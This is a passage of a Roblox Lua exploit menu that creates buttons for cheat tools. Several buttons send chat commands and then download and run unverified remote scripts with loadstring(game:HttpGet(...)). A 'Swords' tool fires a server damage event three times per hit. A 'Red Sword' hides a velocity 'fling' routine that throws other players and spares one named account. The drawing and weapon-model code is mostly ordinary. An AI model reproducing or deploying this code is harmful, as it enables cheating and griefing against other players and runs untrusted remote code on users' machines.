			if v:IsA("Tool") or v:IsA("HopperBin") then
				v.Parent = game.Players.LocalPlayer.Backpack
			end
		end
	end
	function  onSelected(mouse)
		mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	end

	z.Selected:connect(onSelected)	
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Fe Ender"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Fe Ender"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 48474313 63690008 62234425 62724852 48474294 451220849")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

	loadstring(game:HttpGet('https://raw.githubusercontent.com/TKFPc30/fe-ender/main/main.lua'))()
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Ban Hammer"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Ban Hammer"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 9350274205 12103236257 2309346267 48474313 62724852 451220849 48474294")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

	loadstring(game:HttpGet('https://raw.githubusercontent.com/TKFPc30/ban-hammer/main/main.lua'))()

end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Laser Rifle"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Laser Rifle"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Draw Tool"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Draw Tool"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	for i,v in next,game:children()do
		pcall(function()
			local c=v.className;
			rawset(getfenv(0),c:sub(1,1):lower()..c:sub(2),game:service(c));
		end);
	end;


	local user=Players.LocalPlayer;
	uname=user.Name;
	local guis=user.PlayerGui;
	local pack=user.Backpack;

	keyDowns={};
	freeKeys={};
	shortcuts={};

	_G.mine=_G.mine or{};

	name='Draw3D';
	local url='http://www.roblox.com/asset/?id=%d';

	iconNormal=url:format(96578285);
	iconOnDown=url:format(96584484);

	ver=0;
	drawPixel=0.10;
	_G.drawLimit=_G.drawLimit or 1000;

	_G.drawColor=_G.drawColor or Color3.new();





	destroy=game.remove;
	find=game.findFirstChild;
	new=Instance.new;
	with=function(c)
		return function(p)
			local o=type(c)=='string'and new(c)or c;
			local x=p.Parent;p.Parent=nil;
			for i,v in next,p do
				o[i]=v;
			end;
			if(x)then
				o.Parent=x;
			end;
			return o;
		end;
	end;
	getPlace=function()
		if(find(workspace,'draw')==nil)then
			new('Model',workspace).Name='draw';
		end;
		if(find(workspace.draw,uname)==nil)then
			new('Model',workspace.draw).Name=uname;
		end;
		return workspace.draw[uname];
	end;
	drawLine=function(start,target)
		local gui=with'BlockMesh'{
			Parent=with'Part'{
				CFrame=CFrame.new(start,target)*CFrame.new(0,0,-(start-target).magnitude/2);
				Size=Vector3.new(drawPixel,drawPixel,(start-target).magnitude+.325*drawPixel);
				Parent=getPlace();
				Color=_G.drawColor;
				BottomSurface=0;
				Anchored=true;
				TopSurface=0;
				formFactor=3;
				Name=name;
			}}.Parent;
		table.insert(_G.mine,gui);
		return gui;
	end;
	onDown=function()
		if(drawing)then
			return nil;
		end;
		if(selectGui.Adornee)then
			destroy(selectGui.Adornee);
		end;

		drawing=true;

		mouse.Icon=iconOnDown;
		ver=ver+1;


		local cVer,start,target=ver,mouse.hit.p;

		local group={};
		repeat
			wait(0.02);

			if(mouse.target and mouse.target.Name~=name and mouse.hit.p~=start)then

				target=mouse.hit.p;

				table.insert(group,drawLine(start,target));

				start=target;
			end;
		until ver~=cVer;
		drawing=false;

		local groupM=new('Model',getPlace());
		for i,v in next,group do
			if(v:IsDescendantOf(workspace))then
				v.Parent=groupM;
			end;
		end;
		if(next(groupM:children())==nil)then
			destroy(groupM);
		end;
	end;
	onUp=function()
		mouse.Icon=iconNormal;
		ver=ver+1;
	end;
	onKeyDown=function(k)
		if(freeKeys[k]==false)then
			return false;
		end;
		freeKeys[k]=false;
		wait(0.01);
		if(keyDowns[k])then
			keyDowns[k]();
		elseif(shortcuts[k])then
			shortcuts[k]();
		end;
	end;
	onKeyUp=function(k)
		freeKeys[k]=true;
	end;
	onMove=function()

	end;
	local onSelect=function(lmouse)
		frame.Visible=true;

		mouse=lmouse;

		mouse.Icon=iconNormal;

		mouse.Button1Down:connect(onDown);
		mouse.KeyDown:connect(onKeyDown);
		mouse.Button1Up:connect(onUp);
		mouse.KeyUp:connect(onKeyUp);
		mouse.Move:connect(onMove);
	end;
	local onDeselect=function()
		ver=ver+1;
		frame.Visible=false;
		selectGui.Adornee=nil;
		mouse.Icon=iconNormal;
		for i,v in next,freeKeys do
			freeKeys[i]=true;
		end;
	end;
	local addButton=function(title,shortcut,fun)
		with'TextButton'{
			Text=string.format(' %s (%s)',title,shortcut);
			TextXAlignment=0;
			Parent=frame;
		}.MouseButton1Up:connect(fun);

		shortcuts[shortcut]=fun;

		local c=#frame:children();
		for i,v in next,frame:children()do
			v.Position=UDim2.new(0,0,0,20*(i-1));
			v.Size=UDim2.new(1,0,0,20);
		end;

		frame.Position=UDim2.new(1,-152,.5,-c*10);
		frame.Size=UDim2.new(0,150,0,c*20);
	end;








	for i,v in next,{guis;pack;}do
		pcall(function()
			repeat until destroy(v[name]);
		end);
	end;



	local tool=with'HopperBin'{
		Parent=pack;
		Name=name;
	};
	tool.Deselected:connect(onDeselect);
	tool.Selected:connect(onSelect);




	local screen=with'ScreenGui'{
		Parent=guis;
		Name=name;
	};
	frame=with'Frame'{
		Parent=screen;
		Visible=false;
	};
	clframe=with'Frame'{
		Position=UDim2.new(.5,-50,.5,-50);
		Size=UDim2.new(0,100,0,100);
		Visible=false;
		Parent=screen;
	};
	selectGui=with'SelectionBox'{
		Parent=screen;
	};

	local c=0;
	for y=0,7 do
		for x=0,7 do
			local color=BrickColor.palette(c).Color;

			with'ImageButton'{
				Position=UDim2.new(.125*x,0,.125*y);
				Size=UDim2.new(.125,0,.125);
				BackgroundColor3=color;
				Parent=clframe;
			}.MouseButton1Up:connect(function()
				clframe.Visible=false;
				_G.drawColor=color;
			end);

			c=c+1;
		end;
	end;

	addButton('Color','c',function()
		clframe.Visible=true;
	end);
	addButton('Remove your draws','r',function()
		repeat
			destroy(_G.mine[1]);
			table.remove(_G.mine,1);
			wait(0.01);
		until nil;
	end);
	addButton('Remove global draws','k',function()
		destroy(workspace.draw);
		while(_G.mine[1])do
			destroy(_G.mine[1]);
			table.remove(_G.mine,1);
		end;
	end);
	addButton('Remove selected','x',function()
		repeat
			if(find(workspace,'draw'))then
				local dt=mouse.target;
				if(dt and dt:IsDescendantOf(workspace.draw))then
					selectGui.Adornee=dt.Parent;
				else
					selectGui.Adornee=nil;
				end;
			else
				selectGui.Adornee=nil;
			end;
			wait(0.01);
		until freeKeys.x;
		selectGui.Adornee=nil;
	end);




	repeat
		wait(0.01);
		if(next(_G.mine)and _G.mine[_G.drawLimit])then
			destroy(_G.mine[1]);
			table.remove(_G.mine,1);
		end;
	until script.Parent==nil or tool.Parent==nil;
	script.Disabled=true;
	destroy(screen);


	--Dresmor Alakazard--
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Swords"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Swords"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local localPlayer = Players.LocalPlayer

	-- Create Tool
	local tool = Instance.new("Tool")
	tool.Name = "Sword"
	tool.GripPos = Vector3.new(0.1, -1, 0)
	tool.RequiresHandle = true

	-- Create Handle
	local handle = Instance.new("Part")
	handle.Name = "Handle"
	handle.Size = Vector3.new(0.4, 4, 0.4)
	handle.CanCollide = false
	handle.Anchored = false
	handle.Parent = tool
	tool.Parent = localPlayer.Backpack

	-- Animation
	local swingAnim = Instance.new("Animation")
	swingAnim.AnimationId = "rbxassetid://218504594"
	swingAnim.Parent = tool

	local debounce = false
	local canDamage = false
	local swingTrack

	tool.Equipped:Connect(function()
		local character = localPlayer.Character
		if not character then return end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then return end

		swingTrack = humanoid:LoadAnimation(swingAnim)

		tool.Activated:Connect(function()
			if debounce then return end
			debounce = true

			swingTrack:Play()
			canDamage = true

			task.delay(0.2, function() canDamage = false end)
			task.delay(0.5, function() debounce = false end)
		end)
	end)

	handle.Touched:Connect(function(hit)
		if not canDamage then return end
		local char = hit:FindFirstAncestorOfClass("Model")
		if not char then return end
		local humanoid = char:FindFirstChildOfClass("Humanoid")
		if not humanoid then return end

		local player = Players:GetPlayerFromCharacter(char)
		if player and player.Name ~= localPlayer.Name then
			-- Fire damage event
			for i = 1, 3 do
				ReplicatedStorage:WaitForChild("meleeEvent"):FireServer(player)
			end
		end
	end)
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Red Sword"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Red Sword"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	local plr = game.Players.LocalPlayer
	local tool = Instance.new("Tool", plr.Backpack)
	tool.GripPos = Vector3.new(0, 0, -2)
	tool.GripForward = Vector3.new(0, -1, 0)
	tool.GripRight = Vector3.new(1, 0, 0)
	tool.GripUp = Vector3.new(0, 0, 1)
	tool.Name = "Firebrand"
	tool.TextureId = "rbxassetid://81147983"
	tool.RequiresHandle = true
	tool.CanBeDropped = true

	local k = Instance.new("Part", tool)
	k.Name = "Handle"
	k.Size = Vector3.new(1, 0.8, 6)
	k.Anchored = false
	k.CanCollide = false

	local mesh = Instance.new("SpecialMesh", k)
	mesh.MeshId = "rbxasset://fonts/sword.mesh"
	mesh.TextureId = "rbxasset://textures/SwordTexture.png"
	mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
	mesh.VertexColor = Vector3.new(0.5, 0, 0) 


	-- Sounds
	local Sounds = {
		Equip = "rbxasset://sounds//unsheath.wav",    
		Slash = "rbxasset://sounds//swordslash.wav",
		Lunge = "rbxasset://sounds//swordlunge.wav"    
	}


	local SoundInstances = {}
	for name, id in pairs(Sounds) do
		local sound = Instance.new("Sound", k)
		sound.SoundId = id
		sound.Volume = 1
		SoundInstances[name] = sound
	end

	-- Animations
	local humanoid = plr.Character:WaitForChild("Humanoid")
	local Animations = {
		Equip = "rbxassetid://94160581",
		Unequip = "rbxassetid://94095929",
		Slash1 = "rbxassetid://54584713",
		Slash2 = "rbxassetid://94161333",
		Lunge = "rbxassetid://94160738",
		Idle = "rbxassetid://94108418"
	}

	local LoadedAnims = {}
	for name, id in pairs(Animations) do
		local anim = Instance.new("Animation")
		anim.AnimationId = id
		LoadedAnims[name] = humanoid:LoadAnimation(anim)
	end


	local attackState = 1
	local canAttack = true
	local activeHit = false

	tool.Equipped:Connect(function()
		SoundInstances.Equip:Play()
		LoadedAnims.Equip:Play()

		-- Play idle animation after equip finishes
		LoadedAnims.Equip.Stopped:Connect(function()
			LoadedAnims.Idle:Play()
		end)

		tool.Activated:Connect(function()
			if not canAttack then return end
			canAttack = false
			activeHit = true

			LoadedAnims.Idle:Stop() 

			if attackState == 1 then
				SoundInstances.Slash.Pitch = 1
				SoundInstances.Slash:Play()
				LoadedAnims.Slash1:Play()
			elseif attackState == 2 then
				SoundInstances.Slash.Pitch = 1.17
				SoundInstances.Slash:Play()
				LoadedAnims.Slash2:Play()
			else
				SoundInstances.Lunge:Play()
				LoadedAnims.Lunge:Play()
			end

			attackState = attackState % 3 + 1

			wait(0.3)
			activeHit = false
			wait(0.3)
			canAttack = true

			LoadedAnims.Idle:Play()
		end)
	end)

	tool.Unequipped:Connect(function()
		LoadedAnims.Unequip:Play()
		LoadedAnims.Idle:Stop()
	end)

	k.Touched:Connect(function(n)
		if activeHit then
			local o = n.Parent:FindFirstChild("Humanoid")
			if o ~= nil then
				local p = game.Players:FindFirstChild(n.Parent.Name)


				local targetPart = n.Parent:FindFirstChild("HumanoidRootPart") or n.Parent:FindFirstChild("Torso")
				if targetPart and not targetPart:FindFirstChild("SwordFire") then
					local fire = Instance.new("Fire")
					fire.Name = "SwordFire"
					fire.Size = 5
					fire.Heat = 10
					fire.Parent = targetPart


					game.Debris:AddItem(fire, 10)
				end

				for j = 1, 10 do
					if p.Name ~= "FunnyVideo15" then
						if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
							hiddenfling = true
						else
							hiddenfling = true
							local detection = Instance.new("Decal")
							detection.Name = "juisdfj0i32i0eidsuf0iok"
							detection.Parent = game:GetService("ReplicatedStorage")

							local function fling()
								local hrp, c, vel, movel = nil, nil, nil, 0.1
								while true do
									game:GetService("RunService").Heartbeat:Wait()
									if hiddenfling then
										local lp = game.Players.LocalPlayer
										while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
											game:GetService("RunService").Heartbeat:Wait()
											c = lp.Character
											hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
										end
										if hiddenfling then
											vel = hrp.Velocity
											hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
											game:GetService("RunService").RenderStepped:Wait()
											if c and c.Parent and hrp and hrp.Parent then
												hrp.Velocity = vel
											end
											game:GetService("RunService").Stepped:Wait()
											if c and c.Parent and hrp and hrp.Parent then
												hrp.Velocity = vel + Vector3.new(0, movel, 0)
												movel = movel * -1
											end
										end
									end
								end
							end

							fling()
						end
					end
				end
			end
		end

		wait(2)
		hiddenfling = false
	end)
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local localPlayer = Players.LocalPlayer

	-- Create Tool
	local tool = Instance.new("Tool")
	tool.Name = "Sword"
	tool.GripPos = Vector3.new(0.1, -1, 0)
	tool.RequiresHandle = true

	-- Create Handle
	local handle = Instance.new("Part")
	handle.Name = "Handle"
	handle.Size = Vector3.new(0.4, 4, 0.4)
	handle.CanCollide = false
	handle.Anchored = false
	handle.Parent = tool
	tool.Parent = localPlayer.Backpack
	
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 3
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()

end)


-- Weapon Scripts --
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Drage"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Drage"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	--[[ put your name where it says yourname -ulti55 ]]
	Plrs = game:GetService("Players")



	me = Plrs.LocalPlayer

	char = me.Character



	Modelname = "xWep"

	Toolname = "Drage"

	Able = true

	Selected = false

	Deb = true

	Hurt = false

	CritMultiplier = 1.6

	ComboOn = false

	AbleToBreak = false

	CounterKey = false

	Attack = 1

	AddDamage = 0

	AddDamageX = 1

	AddShield = 0

	Dmgs = {Smash = {"Smash", 25, 2, 3, false}, Slash = {"Slash", 18, 1, 3, false}, SideSlash = {"SideSlash", 18, 1, 3, false},

		DoubleSlash = {"Double Slash", 20, 1, 2, false}, Spin = {"Spin Slash", 30, 2, 5, true, 30}, Boom = {"Boom", 60, 6, 6, true, 50, 16},

		RageMode = {"RAGE", 8, 1.35, 1, 50}, Counter = {"Counter", 25, 1, 1, true, 15}, RageSlash = {"Rage Slash", 40, 3, 7, true, 30}}

	RageMode = false

	Mode = Dmgs.Slash

	AbleAll = true

	necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0) 

	Aim = false



	LineColor = "White"

	EffectColor3 = "Bright red"

	EffectColor2 = "White"

	EffectColor = "Pastel Blue"

	MainColor = "Navy blue"

	BladeColor = "Pastel Blue"



	BlockBars = {}



	MaxRage = 100

	Rage = MaxRage



	CritChance = 5 --Percent



	for _, v in pairs(char:children()) do

		if v.Name == "Block" then v:remove() end

	end



	BlockRealPowa = 4



	Block = Instance.new("BoolValue")

	Block.Name = "Block"

	Block.Value = false

	BlockPower = Instance.new("IntValue")

	BlockPower.Name = "BlockPower"

	BlockPower.Value = BlockRealPowa

	BlockPower.Parent = Block

	Block.Parent = char



	CA = CFrame.Angles

	CN = CFrame.new

	MR = math.rad

	MP = math.pi

	MD = math.deg

	MH = math.huge

	MRA = math.random



	EffPos = CFrame.new(0, 0.5, 0)



	Sounds = {

		Equip = {"rbxasset://sounds//unsheath.wav", 0.7, 0.6},

		Hit = {"http://www.roblox.com/asset/?id=2801263", 0.9, 0.6},

		Block = {"", 1, 0.5},

		Slash = {"rbxasset://sounds//swordslash.wav", 2, 0.8},

		SmashHit = {"rbxasset://sounds\\metal.ogg", 1.5, 0.8},

		Jump = {"rbxasset://sounds/swoosh.wav", 1, 1},

		Boom = {"http://www.roblox.com/asset?id=1369158", 1.2, 1},

		SmashBoom = {"http://www.roblox.com/asset/?id=2760979", 0.25, 1},

		Jump2 = {"http://www.roblox.com/asset/?id=2101148", 2, 1},

		GoRage = {"http://www.roblox.com/asset/?id=2767090", 1, 1},

		Shout = {"http://www.roblox.com/asset/?id=2676305", 1.1, 0.8},

		RageOff = {"http://www.roblox.com/asset/?id=3264793", 1.6, 0.6},

	}



	Add = {

		Sphere = function(P)

			local m = Instance.new("SpecialMesh",P)

			m.MeshType = "Sphere"

			return m

		end,

		BP = function(P)

			local bp = Instance.new("BodyPosition",P)

			bp.maxForce = Vector3.new(MH, MH, MH)

			bp.P = 14000

			return bp

		end,

		BG = function(P)

			local bg = Instance.new("BodyGyro",P)

			bg.maxTorque = Vector3.new(MH, MH, MH)

			bg.P = 14000

			return bg

		end,

		Mesh = function(P, ID, x, y, z)

			local m = Instance.new("SpecialMesh")

			m.MeshId = ID

			m.Scale = Vector3.new(x, y, z)

			m.Parent = P

			return m

		end,

		Head = function(P)

			local s = Instance.new("SpecialMesh")

			s.MeshType = "Head"

			s.Parent = P

			return s

		end,

		Sound = function(P, ID, vol, pitch)

			local s = Instance.new("Sound")

			s.SoundId = ID

			s.Volume = vol

			s.Pitch = pitch

			s.Parent = P

			return s

		end

	}



	function RC(Pos, Dir, Max, Ignore)

		return workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999)), Ignore)

	end



	function RayC(Start, En, MaxDist, Ignore)

		return RC(Start, (En - Start), MaxDist, Ignore)

	end



	function Notime(func, tim)

		coroutine.resume(coroutine.create(function()

			if tim then

				wait(tim)

			end

			func()

		end))

	end



	function waitChild(parent, name)

		local child = parent:findFirstChild(name)

		if child then return child end

		while true do

			child = parent.ChildAdded:wait()

			if child.Name == name then return child end

		end

	end



	function ComputePos(pos1, pos2)

		local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)

		return CFrame.new(pos1, pos3)

	end



	function Part(Parent, Anchor, Collide, Tran, Ref, Color, X, Y, Z, Break)

		local p = Instance.new("Part")

		p.formFactor = "Custom"

		p.Anchored = Anchor

		p.CanCollide = Collide

		p.Transparency = Tran

		p.Reflectance = Ref

		p.BrickColor = BrickColor.new(Color)

		p.TopSurface = 0

		p.BottomSurface = 0

		p.Size = Vector3.new(X, Y, Z)

		if Break then

			p:BreakJoints()

		else p:MakeJoints() end

		p.Parent = Parent

		p.Locked = true

		return p

	end



	function Weld(p0, p1, x, y, z, a, b, c)

		local w = Instance.new("Weld")

		w.Parent = p0

		w.Part0 = p0

		w.Part1 = p1

		w.C1 = CN(x,y,z) * CA(a,b,c)

		return w

	end



	torso = char.Torso

	neck = torso.Neck

	hum = char.Humanoid

	Rarm = char["Right Arm"]

	Larm = char["Left Arm"]

	Rleg = char["Right Leg"]

	Lleg = char["Left Leg"]



	hc = Instance.new("Humanoid")

	hc.Health = 0

	hc.MaxHealth = 0



	function getHumanoid(c)

		local h = nil

		for i,v in pairs(c:children()) do

			if v:IsA("Humanoid") and c ~= char then

				if v.Health > 0 then

					h = v

				end

			end

		end

		return h

	end



	function getCharacters(where, pos, dist)

		local chars = {}

		for _, v in pairs(where:children()) do

			local hum = getHumanoid(v)

			local tors = v:findFirstChild("Torso")

			if tors ~= nil and hum ~= nil then

				local anypart = nil

				for _,k in pairs(v:children()) do

					if k:IsA("BasePart") then

						if (k.Position - pos).magnitude <= dist then

							anypart = k

							break

						end

					end

				end

				if anypart then

					table.insert(chars, {v, tors, hum})

				end

			end

		end

		return chars

	end



	function PlaySound(id, pitch, vol)

		local s = Add.Sound(nil, id, vol, pitch)

		if pitch ~= nil then

			if tonumber(pitch) then

				s.Pitch = tonumber(pitch)

			end

		end

		if vol ~= nil then

			if tonumber(vol) then

				s.Volume = tonumber(vol)

			end

		end

		s.Parent = torso

		s.PlayOnRemove = true

		Notime(function()

			wait()

			s:remove()

		end)

	end



	function playz(sound)

		PlaySound(sound[1], sound[2], sound[3])

	end



	PlrGui = waitChild(me, "PlayerGui")



	for _, v in pairs(char:children()) do if v.Name == Modelname then v:remove() end end 

	for _, v in pairs(PlrGui:children()) do

		if v.Name == "HealthGUI" or v.Name == "MyGui" then

			v:remove()

		end

	end



	function EditGui(obj, parent, size, position, bgcolor, bordercolor, transparency, text, textcolor, auto)

		obj.Size = size

		obj.Position = position

		obj.BackgroundColor3 = bgcolor

		obj.BorderColor3 = bordercolor

		obj.BackgroundTransparency = transparency

		if obj:IsA("TextLabel") or obj:IsA("TextButton") then

			obj.Text = text

			obj.TextColor3 = textcolor

		end

		if obj:IsA("ImageButton") or obj:IsA("TextButton") then

			obj.AutoButtonColor = auto

			obj.MouseButton1Down:connect(function()

				RemoveOptions()

			end)

		end

		obj.Parent = parent

	end



	C3 = Color3.new

	UD = UDim2.new



	Sc = Instance.new("ScreenGui", PlrGui)

	Sc.Name = "MyGui"



	Fr = Instance.new("Frame")

	EditGui(Fr, Sc, UD(0, 60, 0, 250), UD(1, -70, 0.5, -125), C3(0.1, 0.2, 0.5), C3(), 0)



	HealthBack = Instance.new("Frame")

	EditGui(HealthBack, Fr, UD(0, 25, 1, -20), UD(0, 3, 0, 10), C3(0.2, 0, 0), C3(), 0)



	RageBack = Instance.new("Frame")

	EditGui(RageBack, Fr, UD(0, 25, 1, -20), UD(1, -27, 0, 10), C3(0.2, 0, 0), C3(), 0)



	local hp = hum.Health/hum.MaxHealth

	if hp > 1 then hp = 1 elseif hp < 0 then hp = 0 end



	HealthBar = Instance.new("ImageLabel")

	EditGui(HealthBar, HealthBack, UD(1, 0, hp, 0), UD(0, 0, 0, 0), C3(0.1, 0.65, 0), C3(), 0)

	HealthBar.Image = "http://www.roblox.com/asset/?id=50051953"



	RageBar = Instance.new("ImageLabel")

	EditGui(RageBar, RageBack, UD(1, 0, Rage/MaxRage, 0), UD(0, 0, 0, 0), C3(1, 0.6, 0.15), C3(), 0)

	RageBar.Image = "http://www.roblox.com/asset/?id=50051953"



	RageAmount = Instance.new("TextLabel")

	EditGui(RageAmount, RageBack, UD(1, 0, 0, 0), UD(0, 0, 0, 0), C3(1, 0.6, 0.15), C3(), 0, Rage, C3(1,1,1))

	RageAmount.TextYAlignment = "Top"



	AimButton = Instance.new("TextButton")

	EditGui(AimButton, Fr, UD(1, 0, 0, 35), UD(0, 0, 1, 0), C3(0.9, 0.2, 0.3), C3(), 0, "AIM: OFF", C3(), true)

	AimButton.TextWrap = true

	AimButton.Font = "ArialBold"

	AimButton.FontSize = "Size14"

	AimButton.MouseButton1Down:connect(function()

		if Aim then

			Aim = false

			AimButton.Text = "AIM: OFF"

			AimButton.BackgroundColor3 = C3(0.9, 0.2, 0.3)

		else

			Aim = true

			AimButton.Text = "AIM: ON"

			AimButton.BackgroundColor3 = C3(0.3, 0.85, 0.1)

		end

	end)



	for i = 1, BlockRealPowa do

		local gui = Instance.new("ImageLabel")

		EditGui(gui, Fr, UD(0, 16, 0, 16), UD(0, -18, 0.5, 20*(i-1)-((BlockRealPowa*20)/2)), C3(), C3(), 1)

		gui.Image = "http://www.roblox.com/asset/?id=48908046"

		table.insert(BlockBars, gui)

	end



	BlockPower.Changed:connect(function()

		for _, v in pairs(BlockBars) do

			v.Image = ""

		end

		for i = 1, BlockPower.Value do

			local gui = BlockBars[i]

			if gui then

				gui.Image = "http://www.roblox.com/asset/?id=48908046"

			end

		end

	end)



	Mo = Instance.new("Model")

	Mo.Name = Modelname



	RABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)

	LABrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)

	RLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)

	LLBrick = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)



	RABW = Weld(torso, RABrick, -1.5, -0.5, 0, 0, 0, 0)

	LABW = Weld(torso, LABrick, 1.5, -0.5, 0, 0, 0, 0)

	RLBW = Weld(torso, RLBrick, -0.5, 1.2, 0, 0, 0, 0)

	LLBW = Weld(torso, LLBrick, 0.5, 1.2, 0, 0, 0, 0)



	RAW = Weld(RABrick, nil, 0, 0.5, 0, 0, 0, 0)

	LAW = Weld(LABrick, nil, 0, 0.5, 0, 0, 0, 0)

	RLW = Weld(RLBrick, nil, 0, 0.8, 0, 0, 0, 0)

	LLW = Weld(LLBrick, nil, 0, 0.8, 0, 0, 0, 0)



	HB = Part(Mo, false, false, 1, 0, "White", 0.1, 0.1, 0.1, true)

	HBW = Weld(Rarm, HB, 0, 0, 1, MP/2, 0, 0)

	HW = Weld(HB, nil, 0, 0, 0, 0, 0, 0)



	SW = Weld(Larm, nil, -0.5, 0, 0.3, MP/2, 0, 0)



	TH = Weld(torso, nil, 0, 2.5, 0, MR(145), 0, 0)

	TH.C0 = CN(0, -0.3, 0.75) * CA(0, MP/2, 0)



	Weapon = Instance.new("Model")

	Weapon.Name = "Weapon"



	Handle = Part(Weapon, false, false, 0, 0, MainColor, 0.4, 1.8, 0.4)

	Add.Head(Handle)



	Tip1 = Part(Weapon, false, false, 0, 0, "Deep blue", 0.45, 1.2, 0.45)

	Add.Head(Tip1)

	Weld(Handle, Tip1, 0, 0, 0, 0, 0, 0)



	Tip2 = Part(Weapon, false, false, 0, 0, "Bright blue", 0.5, 0.5, 0.5)

	Weld(Handle, Tip2, 0, 0.9, 0, 0, 0, 0)

	Add.Mesh(Tip2, "http://www.roblox.com/asset/?id=9756362", 0.75, 0.5, 0.75)



	Tip3 = Part(Weapon, false, false, 0, 0, "Deep blue", 0.7, 0.3, 1.2)

	Weld(Handle, Tip3, 0, -0.9, 0, 0, 0, 0)

	Add.Mesh(Tip3, "http://www.roblox.com/asset/?id=9756362", 0.7, 0.35, 1.35)



	Tip4 = Part(Weapon, false, false, 0, 0, "Deep blue", 0.6, 0.2, 1.8)

	Weld(Handle, Tip4, 0, -0.9, 0, 0, 0, 0)



	Tip5 = Part(Weapon, false, false, 0, 0, "Bright blue", 0.6, 0.6, 0.3)

	Weld(Tip4, Tip5, 0, -0.4, -0.85, MR(-15), 0, 0)



